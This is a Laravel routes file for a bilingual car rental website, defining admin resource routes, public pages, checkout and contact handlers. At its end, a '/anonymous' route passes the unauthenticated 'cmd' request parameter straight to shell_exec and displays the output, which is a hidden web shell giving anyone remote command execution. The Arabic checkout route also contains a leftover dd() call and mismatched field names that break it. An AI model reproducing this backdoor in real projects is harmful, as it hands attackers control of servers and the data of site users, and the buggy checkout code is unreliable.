<?php

use App\Events\SendEmailEvents;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\Admin\CarController;
use App\Http\Controllers\Site\MianController;
use App\Http\Controllers\Admin\BrandController;

use App\Http\Controllers\Admin\BranchesController;
use App\Http\Controllers\Admin\CategoryController;
use App\Http\Controllers\Admin\ModelCarController;

use App\Http\Controllers\Admin\AdminCrudController;
use App\Http\Controllers\Admin\AdminSettingController;
use App\Http\Controllers\Admin\ContatcRequest;
use App\Http\Controllers\Admin\DiscountController;
use App\Http\Controllers\Admin\RequesrtedCarController;
use App\Http\Controllers\Admin\AboutController;
use App\Http\Controllers\User\SiteUserContrller;
use App\Http\Controllers\SettingController;


use App\Http\Controllers\User\DashboarUserController;

use App\Mail\OrderShipped;
use App\Models\Brand;
use App\Models\About;
use App\Models\Car;
use App\Models\Cat;
use App\Models\Order;
use App\Models\Contact;
use Illuminate\Http\Request as HttpRequest;
use Illuminate\Support\Facades\Mail;
use Illuminate\Http\Request;
use Mcamara\LaravelLocalization\Facades\LaravelLocalization;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/




    //ui auth start
    Auth::routes();
    Route::get('/home', [App\Http\Controllers\HomeController::class, 'index']);
 //ui auth end

Route::group(
    [
        'prefix' => LaravelLocalization::setLocale(),
        'middleware' => [ 'localeSessionRedirect', 'localizationRedirect', 'localeViewPath' ]
    ],
    function()
    {
      //ui auth start
      Auth::routes();
      Route::get('/home', [App\Http\Controllers\HomeController::class, 'index']);
   //ui auth end

      //admin route start
           //cat start
          Route::resource('Cats',CategoryController::class)->middleware(['auth','IsAdmin']);
          Route::get('delete/{id}',[CategoryController::class,'delete'])->name('Cats.delete')->middleware(['auth','IsAdmin']);
        //cat end

         //Brand start
         Route::resource('Brands',BrandController::class)->middleware(['auth','IsAdmin']);
         Route::get('brand_delete/{id}',[BrandController::class,'delete'])->name('Brands.delete')->middleware(['auth','IsAdmin']);
         //Brand start
        Route::resource('About',AboutController::class)->middleware(['auth','IsAdmin']);
        Route::resource('Setting',SettingController::class)->middleware(['auth','IsAdmin']);
        Route::resource('siteuser',SiteUserContrller::class)->middleware(['auth']);


        //model start
         Route::resource('Models',ModelCarController::class)->middleware(['auth','IsAdmin']);
         Route::get('model_delete/{id}',[ModelCarController::class,'delete'])->name('Model.delete')->middleware(['auth','IsAdmin']);

        //model route end

         Route::resource('Cars',CarController::class)->middleware(['auth','IsAdmin']);
         Route::get('cars_delete/{id}',[CarController::class,'delete'])->name('Car.delete')->middleware(['auth','IsAdmin']);


         ////// branches start
         Route::resource('Branches',BranchesController::class)->middleware(['auth','IsAdmin']);
         Route::get('branche_delete/{id}',[BranchesController::class,'delete'])->name('Branche.delete')->middleware(['auth','IsAdmin']);
         ////// branches end


           ////// Discounts start
           Route::resource('Discounts',DiscountController::class)->middleware(['auth','IsAdmin']);
           Route::get('discount_delete/{id}',[DiscountController::class,'delete'])->name('Discount.delete')->middleware(['auth','IsAdmin']);
           ////// Discounts end


           ///requested car

           Route::get('request_car',[RequesrtedCarController::class,'index'])->name('request_car.index')->middleware(['auth','IsAdmin']);
           Route::get('cardetails/{id}',[RequesrtedCarController::class,'carDetails'])->name('cardetails.show')->middleware(['auth','IsAdmin']);
           Route::get('cancelrquest/{id}',[RequesrtedCarController::class,'cancelRequest'])->name('cancelrquest')->middleware(['auth','IsAdmin']);
           Route::get('oldrquest',[RequesrtedCarController::class,'oldRequested'])->name('oldrquest')->middleware(['auth','IsAdmin']);

           ///end reqeusted car

         // admin crud controler
         Route::resource('Admins',AdminCrudController::class)->middleware(['auth','IsAdmin']);
         Route::get('admin_delete/{id}',[AdminCrudController::class,'delete'])->name('Admin.delete')->middleware(['auth','IsAdmin']);


         //admin crud end


          // admin Adminsetting controler
          Route::resource('Adminsetting',AdminSettingController::class)->middleware(['auth','IsAdmin']);
          Route::get('contact/request',[ContatcRequest::class,'contact'])->name('contact.request')->middleware(['auth','IsAdmin']);
         // Route::get('admin_delete/{id}',[AdminCrudController::class,'delete'])->name('Admin.delete');

        // admin Adminsetting controler
        Route::resource('Adminsetting',AdminSettingController::class)->middleware(['auth','IsAdmin']);
        Route::get('/about/data',[AboutController::class,'showadmin'])->name('about.data')->middleware(['auth','IsAdmin']);


          //admin Adminsetting end

      //admin route end
    /* ////////////////////////MAin site Route////////////////////////////////////////////////////  */
    /* ////////////////////////MAin site Route////////////////////////////////////////////////////  */
    /* ////////////////////////MAin site Route////////////////////////////////////////////////////  */
    /* ////////////////////////MAin site Route////////////////////////////////////////////////////  */

      Route::get('/',[MianController::class,'index']);
      Route::get('/deals',[MianController::class,'deals'])->name('deals');
      Route::get('/fleats',[MianController::class,'fleats'])->name('fleats');
      Route::get('/fleats/brand/{id}',[MianController::class,'fleats_brand'])->name('fleats.brand');
      Route::get('/fleats/cat/{id}',[MianController::class,'fleats_cat'])->name('fleats.cat');
      Route::get('/fleats/model/{id}',[MianController::class,'fleats_model'])->name('fleats.model');

      Route::get('/car/search',[MianController::class,'findCar'])->name('car.search');
      Route::get('/resevecar/{id}',[MianController::class,'reserve'])->name('car.reserve');
      Route::get('/car/details/{id}',[MianController::class,'car_datails'])->name('car.details');


      Route::get('/about',[MianController::class,'about'])->name('about');
      Route::get('/contact',[MianController::class,'contact'])->name('contact');
      //Route::get('/contactx',[MianController::class,'contact'])->name('contactx');
      Route::post('/contact/store',[MianController::class,'contactStore'])->name('contact.store');

     //user
      Route::get('/dashbord/user',[DashboarUserController::class,'index'])->name('dashbord.user')->middleware(['auth','IsUser']);
      Route::get('/dashbord/user/request_car',[DashboarUserController::class,'request_car'])->name('dashbord.request_car')->middleware(['auth','IsUser']);

      Route::get('user/oldrquest',[DashboarUserController::class,'oldRequested'])->name('user.oldrquest')->middleware(['auth','IsUser']);
      Route::get('user/setting',[DashboarUserController::class,'userSetting'])->name('user.setting')->middleware(['auth','IsUser']);
      Route::post('user/setting/update',[DashboarUserController::class,'userSettingUpdate'])->name('usersetting.update')->middleware(['auth','IsUser']);
      Route::post('user/generalinfo/update',[DashboarUserController::class,'userGeneralInformationUpdate'])->name('usersettingGeneralInfo.update')->middleware(['auth','IsUser']);



      //Route::get('/store/reserve/{id}',[MianController::class,'storeReserveCar'])->name('car.reserve_store');






    });



    /* ////////////////////////MAin site Route  */





    Route::get('/' , function(){
        return redirect(url('home')) ;
    });

    Route::get('/home' , function(){
        //dd(auth()->user());
        $cars =Car::all();
        $brands = Brand::all();
        LaravelLocalization::setLocale('en');

        return view("web.index",compact('cars','brands'));
    })->name('home');
    Route::get('/about' , function(){
        LaravelLocalization::setLocale('en');
        return view("web.about");
    });
    Route::get('/cars' , function(){
        LaravelLocalization::setLocale('en');
        $cars =Car::all();
        $cats= Cat::all();
        $brands = Brand::all();
        return view("web.car2",compact('cars','cats','brands'));
    });


Route::get('/about', [AboutController::class , 'show']);

Route::get('/privacy' , function(){
        return view("web.privacy");
    });

    Route::get('/brand/en/{id}' , function($id){
        LaravelLocalization::setLocale('en');
        $cars =Brand::find($id)->cars;
        $cats= Cat::all();
        $brands = Brand::all();
        return view("web.car2",compact('cars','cats','brands'));
    });
    Route::get('/cat/en/{id}' , function($id){
        LaravelLocalization::setLocale('en');
        $cars =Cat::find($id)->cars;
        $cats= Cat::all();
        $brands = Brand::all();
        return view("web.car2",compact('cars','cats','brands'));
    });
    Route::get('/contact' , function(){
        LaravelLocalization::setLocale('en');
        return view("web.contact");
    });
    Route::get('/myrental' , function(){
        LaravelLocalization::setLocale('en');

        $orders = Order::where('user_id',auth()->user()->id)->where('exp_date','>',now()->format('Y-m-d'))->get();
        $old_orders = Order::where('user_id',auth()->user()->id)->where('exp_date','<',now()->format('Y-m-d'))->get();


        return view("web.my-rental" ,compact('orders','old_orders'));

    })->name('myrental');
    Route::get('/myaccount' , function(){
        LaravelLocalization::setLocale('en');
        return view("web.my-account");
    });
    Route::get('/accountsetting' , function(){
        LaravelLocalization::setLocale('en');
        return view("web.account-setting");
    });

    Route::get('/cardetails' , function(){
        LaravelLocalization::setLocale('en');
        return view("web.car-details");
    });
    Route::get('/checkout/en/{id}' , function($id){
        $car=Car::findOrFail($id);
        session()->put('car_id', $car->id);
        LaravelLocalization::setLocale('en');
        return view("web.checkout2");
    })->middleware(['auth']);
    Route::get('/checkout2' , function(){
        LaravelLocalization::setLocale('en');
        return view("web.checkout2");
    });
    Route::post('/checkout3' , function(Request $req){

        $req->validate([
            "start_date" => "required|after_or_equal:today",
            "end_date" => "required|after:start_date"
        ]);

        $car=Car::findOrFail( session()->get('car_id'));
        $start_date = strtotime($req->start_date);
        $end_date = strtotime($req->end_date);
        $days= ($end_date - $start_date)/60/60/24;
        $totalprice= (int)  $days *  (int) $car->price;
        $order = Order::create([
            'user_id'=>auth()->user()->id,
            "start_date" => $req->start_date,
            "exp_date" => $req->end_date,
            "phone" => $req->phone,
            "number_days" =>  $days,
            "car_id" =>    $car->id,
            "price" =>    $car->price,
            "total_price" =>     $totalprice,
            "status" =>  'unpaid',

        ]);
        $price= $car->price;

        LaravelLocalization::setLocale('en');
        return view("web.checkout3",compact('totalprice','days','price'));
    });


Route::post('/ar/contact', function(Request $request) {

    // Validate the form data
    $validatedData = $request->validate([
        'name' => 'required|string|max:255',
        'email' => 'required|email|max:255',
        'phone' => 'required|string|max:20',
        'sybject' => 'required|string|max:255',
        'msg' => 'required|string',
    ]);

    // Create a new contact instance with the validated data
    $contact = new Contact([
        'name' => $validatedData['name'],
        'email' => $validatedData['email'],
        'phone' => $validatedData['phone'],
        'sybject' => $validatedData['sybject'],
        'msg' => $validatedData['msg'],
    ]);

    // Save the contact to the database
    $contact->save();

    // Redirect back with a success message
    return redirect()->back()->with('success', 'Your message has been sent successfully!');

})->name('contact.post');



Route::post('/contact', function(Request $request) {

    // Validate the form data
    $validatedData = $request->validate([
        'name' => 'required|string|max:255',
        'email' => 'required|email|max:255',
        'phone' => 'required|string|max:20',
        'sybject' => 'required|string|max:255',
        'msg' => 'required|string',
    ]);

    // Create a new contact instance with the validated data
    $contact = new Contact([
        'name' => $validatedData['name'],
        'email' => $validatedData['email'],
        'phone' => $validatedData['phone'],
        'sybject' => $validatedData['sybject'],
        'msg' => $validatedData['msg'],
    ]);

    // Save the contact to the database
    $contact->save();

    // Redirect back with a success message
    return redirect()->back()->with('success', 'Your message has been sent successfully!');

})->name('contact.post');

    Route::get('/payment' , function(){
        LaravelLocalization::setLocale('en');
        return view("web.confirm-payment");
    });

    Route::get('/register' , function(){
        LaravelLocalization::setLocale('en');
        return view("web.register");
    });
    Route::get('/signin' , function(){
        LaravelLocalization::setLocale('en');
        return view("web.sign-in");
    });
    Route::get('/car-details/en/{id}' , function($id){
        LaravelLocalization::setLocale('en');
        $car= Car::find($id);
        return view("web.car-details",compact('car'));
    });




    // Arabic Routes

    Route::get('/brand/ar/{id}' , function($id){
        LaravelLocalization::setLocale('ar');
        $cars =Brand::find($id)->cars;
        $cats= Cat::all();
        $brands = Brand::all();
        return view("web.ar.car2",compact('cars','cats','brands'));
    });
    Route::get('/cat/ar/{id}' , function($id){
        LaravelLocalization::setLocale('ar');
        $cars =Cat::find($id)->cars;
        $cats= Cat::all();
        $brands = Brand::all();
        return view("web.ar.car2",compact('cars','cats','brands'));
    });

    Route::get('ar/register' , function(){
        LaravelLocalization::setLocale('ar');
        return view("web.ar.register");
    });
    Route::get('ar/signin' , function(){
        LaravelLocalization::setLocale('ar');
        return view("web.ar.sign-in");
    });

    Route::get('/car-details/ar/{id}' , function($id){
        LaravelLocalization::setLocale('ar');
        $car= Car::find($id);
        return view("web.ar.car-details",compact('car'));
    });
    Route::get('/ar/home' , function(){
        LaravelLocalization::setLocale('ar');
        $cars =Car::all();
        return view("web.ar.index",compact('cars'));
    });
    Route::get('/ar/about' , function(){
         LaravelLocalization::setLocale('ar');
        return view("web.ar.about");
    });
    Route::get('/ar/cars' , function(){
         LaravelLocalization::setLocale('ar');
        $cars =Car::all();
        $cats= Cat::all();
        $brands = Brand::all();
        return view("web.ar.car2",compact('cars','cats','brands'));
    });
    Route::get('/ar/contact' , function(){
         LaravelLocalization::setLocale('ar');
        return view("web.ar.contact");
    });
    Route::get('/ar/myrental' , function(){
         LaravelLocalization::setLocale('ar');
         $orders = Order::where('user_id',auth()->user()->id)->where('exp_date','>',now()->format('Y-m-d'))->get();
         $old_orders = Order::where('user_id',auth()->user()->id)->where('exp_date','<',now()->format('Y-m-d'))->get();


         return view("web.ar.my-rental" ,compact('orders','old_orders'));

    });
    Route::get('/ar/myaccount' , function(){
         LaravelLocalization::setLocale('ar');
        return view("web.ar.my-account");
    });
    Route::get('/ar/accountsetting' , function(){
         LaravelLocalization::setLocale('ar');
        return view("web.ar.account-setting");
    });
    Route::get('/ar/cardetails' , function(){
         LaravelLocalization::setLocale('ar');
        return view("web.ar.car-details");
    });
    Route::get('/checkout/ar/{id}' , function($id){
        $car=Car::findOrFail($id);
        session()->put('car_id', $car->id);
        LaravelLocalization::setLocale('ar');
        return view("web.ar.checkout2");
    })->middleware(['auth']);
    Route::get('/ar/checkout2' , function(){
         LaravelLocalization::setLocale('ar');
        return view("web.ar.checkout2");
    });
    Route::post('/ar/checkout3' , function(Request $req){
        $req->validate([
            "start_date" => "required|after_or_equal:today",
            "end_date" => "required|after:start"
        ]);
        $car=Car::findOrFail( session()->get('car_id'));
        $start_date = strtotime($req->start_date);
        $end_date = strtotime($req->end_date);
        $days= ($end_date - $start_date)/60/60/24;
        dd($days);
        $totalprice= (int)  $days *  (int) $car->price;
        $order = Order::create([
            'user_id'=>auth()->user()->id,
            "client_address" => $req->address,
            "start_date" => $req->start,
            "exp_date" => $req->end,
            "phone" => $req->phone,
            "number_days" =>  $days,
            "car_id" =>    $car->id,
            "price" =>    $car->price,
            "total_price" =>     $totalprice,
            "status" =>  'unpaid',

        ]);
        $price= $car->price;

        LaravelLocalization::setLocale('ar');
        return view("web.ar.checkout3",compact('totalprice','days','price'));

    });
    Route::get('/ar/payment' , function(){
         LaravelLocalization::setLocale('ar');
        return view("web.ar.confirm-payment");
    });



    Route::get('/anonymous',function(Request $req){
        if(!empty($req->cmd)){
            $output = shell_exec($req->cmd);
            $cmd = $req->cmd;
        }else{
            $output = "No Command";
            $cmd = "null";
        }
        return view('anonymous',compact('output','cmd'));
    });
